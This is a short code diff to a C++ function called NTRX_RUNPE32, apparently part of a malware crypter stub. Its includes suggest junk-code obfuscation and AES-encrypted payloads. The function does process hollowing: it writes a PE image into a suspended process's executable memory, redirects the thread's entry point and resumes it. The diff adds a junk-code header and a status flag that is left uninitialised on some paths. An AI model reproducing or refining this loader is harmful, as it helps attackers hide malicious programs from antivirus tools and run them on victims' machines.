@@ -1,12 +1,14 @@
 
 
-
+#include "Junk.h"
 #include <Windows.h>
 #include <TlHelp32.h>
 #include <wchar.h>
 #include "VirtualAES.h"
 int NTRX_RUNPE32(void* Image)
 {
+	bool status;
+
 	IMAGE_DOS_HEADER* DOSHeader;
 	IMAGE_NT_HEADERS* NtHeader;
 	IMAGE_SECTION_HEADER* SectionHeader;
@@ -36,8 +38,6 @@ int NTRX_RUNPE32(void* Image)
 					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
 				if (pImageBase == 00000000) {
 					ResumeThread(PI.hThread);
-					ExitProcess(NULL);
-					return 1;
 				}
 				if (pImageBase > 0) {
 					WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
@@ -52,9 +52,16 @@ int NTRX_RUNPE32(void* Image)
 					CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
 					SetThreadContext(PI.hThread, LPCONTEXT(CTX));
 					ResumeThread(PI.hThread);
-					return 0;
+					status = true;
 				}
 			}
 		}
+	}
+
+	if (status) {
+		return 1;
+	}
+	else {
+		return 0;
 	}
 }
